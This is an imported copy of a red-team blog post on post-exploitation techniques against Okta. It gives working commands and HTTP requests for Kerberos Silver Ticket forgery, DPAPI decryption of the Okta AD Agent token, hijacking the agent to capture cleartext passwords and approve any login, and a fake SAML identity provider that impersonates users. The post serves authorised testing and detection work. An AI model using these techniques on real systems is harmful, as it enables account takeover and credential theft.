---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-09-18_okta-for-red-teamers.md
original_filename: 2023-09-18_okta-for-red-teamers.md
title: Okta For Red Teamers
category: documents
detected_topics:
- sso
- oauth
- saml
- access-control
- command-injection
- mfa
tags:
- imported
- documents
- sso
- oauth
- saml
- access-control
- command-injection
- mfa
language: en
raw_sha256: 9c8d53b541dcc468b051f203dfc34b2e93a31a8f45e905418f11a47d803ee52c
text_sha256: 81a3987e4ecca1a7cba1fc869c207394bd7ca48d90876f7e91da018b610d8eb7
ingested_at: '2026-06-28T07:32:26Z'
sensitivity: unknown
redactions_applied: true
---

# Okta For Red Teamers

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-09-18_okta-for-red-teamers.md
- Source Type: markdown
- Detected Topics: sso, oauth, saml, access-control, command-injection, mfa
- Ingested At: 2026-06-28T07:32:26Z
- Redactions Applied: True
- Raw SHA256: `9c8d53b541dcc468b051f203dfc34b2e93a31a8f45e905418f11a47d803ee52c`
- Text SHA256: `81a3987e4ecca1a7cba1fc869c207394bd7ca48d90876f7e91da018b610d8eb7`


## Content

---
title: "Okta For Red Teamers"
page_title: "TrustedSec | Okta for Red Teamers"
url: "https://www.trustedsec.com/blog/okta-for-red-teamers/"
final_url: "https://www.trustedsec.com/blog/okta-for-red-teamers"
authors: ["Adam Chester (@_xpn_)"]
bugs: ["Post-exploitation"]
publication_date: "2023-09-18"
added_date: "2023-09-19"
source: "pentester.land/writeups.json"
original_index: 772
---

* [Blog](https://trustedsec.com/blog)
  * [Okta for Red Teamers](https://trustedsec.com/blog/okta-for-red-teamers)

September 18, 2023

# Okta for Red Teamers

Written by Adam Chester 

Red Team Adversarial Attack Simulation

![](https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/OktaRedTeamers_Page.jpg?w=320&h=320&q=90&auto=format&fit=crop&dm=1767068454&s=3daa562330a6073c054903646922aa8a)

Share

  * [Share URL]( "Share URL")
  * [Share via Email](/cdn-cgi/l/email-protection#aa95d9dfc8c0cfc9de97e9c2cfc9c18f989ac5dfde8f989adec2c3d98f989acbd8dec3c9c6cf8f989accd8c5c78f989afed8dfd9decfcef9cfc98f989b8ccbc7da91c8c5ced397e5c1decb8f989accc5d88f989af8cfce8f989afecfcbc7cfd8d98f99eb8f989ac2dededad98f99eb8f98ec8f98ecded8dfd9decfced9cfc984c9c5c78f98ecc8c6c5cd8f98ecc5c1decb87ccc5d887d8cfce87decfcbc7cfd8d9 "Share via Email")
  * [Share on Facebook](https://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fokta-for-red-teamers "Share on Facebook")
  * [Share on X](https://twitter.com/share?text=Okta%20for%20Red%20Teamers%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fokta-for-red-teamers "Share on X")
  * [Share on LinkedIn](https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fokta-for-red-teamers&mini=true "Share on LinkedIn")

For a long time, Red Teamers have been preaching the mantra “Don’t make Domain Admin the goal of the assessment” and it appears that customers are listening. Now, you’re much more likely to see objectives focused on services critical to an organization, with many being hosted in the cloud.

With this shift in delegating some of the security burden to cloud services, it’s commonplace to find Identity Providers (IDP) like Microsoft Entra ID or Okta being used. This means that our attention as attackers also needs to shift to encompass these services too.

In this blog post, I’ll discuss some of the post-exploitation techniques that I’ve found to be useful against one such provider, Okta, which has been one of the more popular solutions found in customer environments.

It should be noted that everything in this post is by design. You’ll find no 0dayz here, and many of the techniques require administrative access to pull off. However, to say that the methods demonstrated in this post have been a helpful during engagements is an understatement. Let’s dive in.

## Okta Delegated Authentication

We’ll start with a technology offered to users deploying their Okta tenant alongside traditional on-prem Active Directory (AD), and that is Delegated Authentication.

I recently Tweeted a method that I’ve found useful when compromising Delegated Authentication enabled tenants:

![](https://www.trustedsec.com/wp-content/uploads/2023/09/image0.png)

What was shown was how Windows AD environments integrate with Okta using Kerberos, providing users with the ability to sign into their Okta account without having to bother with credentials each time. This also comes with the added benefit that MFA is often not required.

Now, let’s set the scenario: You’ve compromised an AD account by executing an implant on a workstation, and now you want to pivot to a cloud service which uses Okta as the IDP.

First, we need to take a look at the Okta tenant to see if Delegated Authentication has been enabled. This is simply a case of performing a DNS lookup:
  
  
  dig tenantname.kerberos.okta.com

If the lookup comes back with a pair of A records, we know that Delegated Authentication has been enabled:

![](https://www.trustedsec.com/wp-content/uploads/2023/09/image1.png)

Alternatively, if you’re feeling like you aren’t going to be caught making service account lookups, you could query for the SPN via LDAP:
  
  
  (servicePrincipalName=HTTP/customername.kerberos.okta.com)

Again, we’ll get an account coming back in the case that Delegated Authentication has been enabled:

![](https://www.trustedsec.com/wp-content/uploads/2023/09/image2.png)

So, we have identified that Delegated Authentication is enabled in the Okta tenant, now what? Well, we request a TGS of course:
  
  
  getST.py -spn HTTP/clientname.kerberos.okta.com -dc-ip 1.2.3.4 LAB/comprommiseduser

With a ticket retrieved for the AD user, we need to inject this on a host we control using Rubeus or Mimikatz:

![](https://www.trustedsec.com/wp-content/uploads/2023/09/image3.png)

You’ll need to make sure that `clientname.kerberos.okta.com` is added to the “Intranet” security zone in Internet Options. And then, in our browser, if we hit the below URL, we should find that we receive a JSON response providing an `OK` result when the Kerberos ticket is accepted:

![](https://www.trustedsec.com/wp-content/uploads/2023/09/image4.png)

Heading over to the Okta dashboard, if everything is OK, you’ll be signed in using Kerberos:

![](https://www.trustedsec.com/wp-content/uploads/2023/09/image5.png)

Now as you’ve probably guessed, this also means that if we are able to compromise the actual Okta service account exposing the delegation SPN, we can perform a Silver Ticket attack.

It should be noted that as Okta only support AES for ticket encryption, we’ll need to ensure we have the AES key or plaintext password to authenticate:

![](https://www.trustedsec.com/wp-content/uploads/2023/09/image6.png)

To craft our ticket for the victim user of `testuser`, we use:
  
  
  ticketer.py -domain-sid S-1-5-21-4170871944-1575468979-147100471 -domain lab.local -dc-ip DC01 -aesKey db22ab9c89f2f0d545024f9dfabbed44173397065d8f5b7e172200ca38ed4393 -user-id 1118 -spn HTTP/example.kerberos.okta.com testuser

![](https://www.trustedsec.com/wp-content/uploads/2023/09/image7.png)

And again, deliver this to Okta via our browser session:

![](https://www.trustedsec.com/wp-content/uploads/2023/09/image8.png)

## Hijacking Okta AD Agent

Let’s move onto another scenario that we often encounter. You may find during your engagement that you are able to access a server running the Okta AD Agent. This agent is responsible for syncing domain users and groups over to Okta for provisioning, and also answering authentication requests from Okta as users log into the portal.

By default, the agent is installed to:
  
  
  C:\Program Files (x86)\Okta\Okta AD Agent

We’re going to take a look at the `OktaAgentService.exe.config`, which contains a few interesting bits of XML:

![](https://www.trustedsec.com/wp-content/uploads/2023/09/image9.png)

The Base64 encoded `AgentToken` is where we set our sights. If we open up `OktaAgentService.exe` in dnSpy, we can see how these values are decrypted:

![](https://www.trustedsec.com/wp-content/uploads/2023/09/image10.png)

That’s right.. good ol’ DPAPI! The `RandomEntropy` value is set to a value of:

![](https://www.trustedsec.com/wp-content/uploads/2023/09/image11.png)

This means that we can decrypt this Base64 encoded XML value using:
  
  
  Add-Type -AssemblyName 'System.Security'
  $rand = [byte]174,53,167,191,10,250,125,232,223,147,248,86,65
  
  $k = [System.Security.Cryptography.ProtectedData]::Unprotect([System.Convert]::FromBase64String("AQAAANCMnd8BFdERjH..."), $rand, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
  [System.Text.Encoding]::Unicode.GetString($k)

The DPAPI master key used belongs to the user account running the “Okta AD Agent” service, so you will need to run the above in the context of the service account, or grab the master key for the account and decrypt:

![](https://www.trustedsec.com/wp-content/uploads/2023/09/image12.png)

So what can we do with this token? While we can’t make use of the usual API calls exposed by Okta, there is an “internal” set of API calls we can make.

For example, within `OktaAgentService.exe.config` we have two further XML fields, `APPID` and `AGENTID`. Combined with the `AgentToken`, we can make a `GET` request as follows:
  
  
  GET /api/1/internal/app/activedirectory/[APPID]/agent/[AGENTID]/nextAction?agentVersion=1&pollid=anything HTTP/1.1
  Host: client.okta.com
  Authorization: SSWS 00OfIl_***REDACTED-SUSPECT-TOKEN***This call will block until a user authenticates to Okta (or the request times out), in which case it will return the next provided username and password in cleartext:
  
  
  xml
  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <action>
  <UserAuth actionId="rpc::app.active_directory.agent.reply.ok14-majorecs02a.auw2-ok14.internal//1670637714886//Y5PojoeQQ3KDgHHzA11P9wAAC8g:e9088489-99ff-435a-943b-b7dccc457cb5:">
  <type>USER_AUTH</type>
  <password>abc123</password>
  <useLdapGroupPasswordPolicy>false</useLdapGroupPasswordPolicy>
  <userName>[[email protected]](/cdn-cgi/l/email-protection)</userName>
  </UserAuth>
  </action>

While this allows capturing credentials, we also have the opportunity to reply to this authentication attempt if we want to do something like provide a skeleton key. We do this by issuing the following HTTP request:
  
  
  xml
  POST /api/1/internal/app/activedirectory/0oa7c027u2tcjxoki697/agent/a537ca54okqfsuu0s697/actionResult?responseid=12345 HTTP/1.1
  Host: client.okta.com
  Authorization: SSWS 00JFtjd...WgkeI1Eg5Y
  Content-Type: application/xml; charset=utf-8
  Content-Length: 1362
  
  <agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" actionId="rpc::app.active_directory.agent.reply.ok14-majorecs04a.auw2-ok14.internal//1694301421033//ZPz86MzEBzhpMhSFWzyK5wAAA_Q:440a7d52-704b-4c1b-ac79-afdc241e3080:">
  <type>USER_AUTH</type>
  <status>SUCCESS</status>
  <message></message>
  <errorCode></errorCode>
  <timestamps>
  <actionRecieivedFromOkta>1694358076</actionRecieivedFromOkta>
  <actionSentToLdapServer>1694358076</actionSentToLdapServer>
  <responseReceivedFromLdapServer>1694358076</responseReceivedFromLdapServer>
  <responseSentToOkta>1694358076</responseSentToOkta>
  <actionReceivedFromOktaMilliseconds>20230910150116.726Z</actionReceivedFromOktaMilliseconds>
  <actionSentToLdapServerMilliseconds>20230910150116.741Z</actionSentToLdapServerMilliseconds>
  <responseReceivedFromLdapServerMilliseconds>20230910150116.741Z</responseReceivedFromLdapServerMilliseconds>
  <responseSentToOktaMilliseconds>20230910150116.741Z</responseSentToOktaMilliseconds>
  </timestamps>
  <additionalInfo>{{"ExecutionTime":"12","AgentUpTime":"0 day(s) 22:41:49","DC":"DC01.lab.local","DomainControllerFunctionality":"WIN2016","DomainFunctionality":"WIN2016","ForestFunctionality":"WIN2016","LdapResponseTime":"0"}}</additionalInfo>
  </agentActionResult>

The result of issuing this request is allowing authentication for any user via Okta. We’ll explore this concept more below.

## Hijacking AD As an Admin

We know that we can hijack an Okta AD Agent using a stolen Agent Token, but what about if we have compromised a privileged Okta account and want to do this without an existing agent token? Let’s look at how to do this.

First, we need to create an Okta AD Agent API token. To kick off the authentication flow, we need an OAuth Code. To get this we start by heading to:
  
  
  https://example.okta.com/oauth2/authorize?redirect_uri=%2Foauth-response&response_type=code&client_id=cappT0Hfy97F1BoO1UTR&prompt=select_account

This will give you a permission prompt for you to accept:

![](https://www.trustedsec.com/wp-content/uploads/2023/09/image13.png)

Accepting the presented prompt will give you a redirection to `/oauth-response` along with a `code` parameter:

![](https://www.trustedsec.com/wp-content/uploads/2023/09/image14.png)

We need to take this `code` parameter and request a API token using the POST request:
  
  
  POST /oauth2/token HTTP/1.1
  User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
  Content-Type: application/x-www-form-urlencoded
  Host: example.okta.com
  Content-Length: 65
  Expect: 100-continue
  Accept-Encoding: gzip, deflate
  Connection: Keep-Alive
  
  grant_type=api_token&code=7vzn01sl&client_id=cappT0Hfy97F1BoO1UTR

The response returns to us our API token:
  
  
  {"api_token":"00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd"}

Using this token, we need to associate it with an active AD domain. We do this using the API call:
  
  
  POST /api/1/internal/app/activedirectory/ HTTP/1.1
  User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
  Host: example.okta.com
  Accept: application/xml; charset=UTF-8
  Content-Type: application/xml; charset=UTF-8
  Content-Length: 86
  Authorization: SSWS 00***REDACTED-SUSPECT-TOKEN***  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <domain name="lab.local" />

This will give us back the following XML response, where we need to retain the `id` attribute value for later
  
  
  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <activeDirectory id="0oa4jsza16ar1UdaW696">
  <name>lab.local</name>
  <newInstance>false</newInstance>
  </activeDirectory>

Next, we make a HTTP API call to name our connector:
  
  
  POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent?name=DC02 HTTP/1.1
  Host: example.okta.com
  Content-Type: text/xml
  Content-Length: 0
  Authorization: SSWS 00***REDACTED-SUSPECT-TOKEN***This will return an XML response where again we need to retain the `id` attribute:
  
  
  <?xml version="1.0" encoding="UTF-8" standalone="yes"?><agent id="a532camqiqXMhlOf5697"><name>DC02</name></agent>

Finally, we initialize the connection to allow receiving data:
  
  
  POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent/a532camqiqXMhlOf5697/actionResult?agentVersion=3.13.0.0 HTTP/1.1
  Host: example.okta.com
  Content-Type: text/xml
  Content-Length: 825
  Authorization: SSWS 00***REDACTED-SUSPECT-TOKEN***  <agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <type>INIT</type>
  <status>SUCCESS</status>
  <timestamps>
  <actionRecieivedFromOkta />
  <actionSentToLdapServer />
  <responseReceivedFromLdapServer />
  <responseSentToOkta>1694304008</responseSentToOkta>
  <actionReceivedFromOktaMilliseconds>00010101000000.000Z</actionReceivedFromOktaMilliseconds>
  <actionSentToLdapServerMilliseconds>00010101000000.000Z</actionSentToLdapServerMilliseconds>
  <responseReceivedFromLdapServerMilliseconds>00010101000000.000Z</responseReceivedFromLdapServerMilliseconds>
  <responseSentToOktaMilliseconds>20230910000008.174Z</responseSentToOktaMilliseconds>
  </timestamps>
  <additionalInfo>{}</additionalInfo>
  </agentActionResult>

With this done, our fake AD agent is now ready, and will process authentication attempts as shown previously.

Now obviously we don’t want to be doing all this using Burp, so a tool has been created to support a few use-cases. This is available from [here](https://github.com/xpn/OktaPostExToolkit).

The first mode we can run this tool in is `token` mode, which takes a compromised Agent Token value and will connect to the Okta API, dumping any credentials it receives:
  
  
  python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 token --api-token ***REDACTED*** --app-id 0oa7c027u2TcJxoki697 --agent-id a537cnm9ldwPILkqP697

This option also allows us to add in a skeleton key, which will be used to authenticate any user:

The tool also allows registering a new AD connector if we have administrative credentials available for an Okta user that’s using:
  
  
  python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 oauth --machine-name DC01 --windows-domain lab.local --code OAUTH_CODE_HERE

![](https://www.trustedsec.com/wp-content/uploads/2023/09/image_14_1-1024x274.png)

## Okta Fake SAML Provider

Another technique which has been very useful during assessments is the deployment of a fake SAML provider.

Recently Okta actually provided [a security update](https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection) on in-the-wild attacks using this technique, so it’s certainly useful to know about this when simulating activity on an environment, especially for clients who would like to test their detections of this particular attack.

If we hold access to an elevated Okta account, we can deploy an external Identity Provider as part of Okta’s functionality. This allows external providers like Entra ID to complete the authentication before redirecting the user to Okta to select integrated apps.

But what happens if we control the IDP? Well, it stands to reason that in this case, we can approve any authentication request we want.

To test this, we need a custom Identity Provider to deploy. A very janky SAML IDP which supports our nefarious activities can be found [here](https://github.com/xpn/OktaPostExToolkit). The core idea behind this tool is to allow us to issue signed SAML authentication responses which correspond to any user that we like.

This server will listen for incoming HTTP requests on `/saml`, so we first need to deploy an IDP to Okta.

First, we select the SAML 2.0 IDP:

![](https://www.trustedsec.com/wp-content/uploads/2023/09/image15.png)

When configuring the IDP, we need to pay attention to a few settings. The first is the `Name`, which is the friendly name to be shown to any other administrators of Okta:

![](https://www.trustedsec.com/wp-content/uploads/2023/09/image16-1024x350.png)

Next is the issuer URL, which should be set to the value of an identifier in URI format. This again can be anything, but we’ll use `https://www.example.com/`.

![](https://www.trustedsec.com/wp-content/uploads/2023/09/image17.png)

We also need to set the `IdP Single Sign-On URL` field to the location where our SAML server is running. Now, the cool thing is that this DOES NOT need to be a URL which points to our server. I feel like it’s worth pointing this out because we can get quite creative in the URL that we input here and make the Blue Team’s job a bit harder. For example, we can set this field to something like `https://idp.google.com/saml` if we want to, and the only thing we need to be able to do is to catch the inbound SAML request. Here’s the cool thing: the SAML request is forwarded client-side. By that, I mean that Okta will generate the SAML `AuthRequest` and have our browser redirect to `https://idp.google.com/` along with the SAML request. This of course, means that we can just modify the local hosts file to point `idp.google.com` to `127.0.0.1`:
  
  
  echo '127.0.0.1 idp.google.com' | sudo tee -a /etc/hosts

We also need a signing certificate that we control. This can be self-signed, and generated using OpenSSL with:
  
  
  openssl req -x509 -newkey rsa:2048 -sha256 -days 365 -nodes -keyout example.com.key -out example.com.crt

Again, you can get creative with this, as there are no specific requirements around the authenticity of this certificate.

Once the key is generated, we just upload the certificate to Okta and create our IDP.

![](https://www.trustedsec.com/wp-content/uploads/2023/09/image18.png)

Finally, we need to make sure that `Match Against` is set to `Okta Username or Email` and `Account Link Policy` is set to `Automatic` to allow us to authenticate to existing Okta accounts:

![](https://www.trustedsec.com/wp-content/uploads/2023/09/image19.png)

With everything saved, we need to download the Metadata:

![](https://www.trustedsec.com/wp-content/uploads/2023/09/image20.png)

Then to initiate the authentication request and issue the `AuthRequest`, we navigate to the URL shown in `Assertion Consumer Service URL`:

![](https://www.trustedsec.com/wp-content/uploads/2023/09/image21.png)

Navigating to this URL results in a redirect to our internal SAML server:

![](https://www.trustedsec.com/wp-content/uploads/2023/09/image22.png)

If we provide an email address, we find that we can authenticate as any Okta user without needing to know their credentials.

Let’s see this in action:

Hopefully this post has been useful to you Red Teamers who have been wondering how to navigate Okta when hunting for your objectives. There are plenty more tricks we can use, but with the ones demonstrated in this post, you should be able to show customers just why monitoring cloud based IDPs is so important.

Share

  * [Share URL]( "Share URL")
  * [Share via Email](/cdn-cgi/l/email-protection#b689c5c3d4dcd3d5c28bf5ded3d5dd938486d9c3c2938486c2dedfc5938486d7c4c2dfd5dad3938486d0c4d9db938486e2c4c3c5c2d3d2e5d3d593848790d7dbc68dd4d9d2cf8bf9ddc2d7938486d0d9c4938486e4d3d2938486e2d3d7dbd3c4c59385f7938486dec2c2c6c59385f79384f09384f0c2c4c3c5c2d3d2c5d3d598d5d9db9384f0d4dad9d19384f0d9ddc2d79bd0d9c49bc4d3d29bc2d3d7dbd3c4c5 "Share via Email")
  * [Share on Facebook](https://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fokta-for-red-teamers "Share on Facebook")
  * [Share on X](https://twitter.com/share?text=Okta%20for%20Red%20Teamers%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fokta-for-red-teamers "Share on X")
  * [Share on LinkedIn](https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fokta-for-red-teamers&mini=true "Share on LinkedIn")
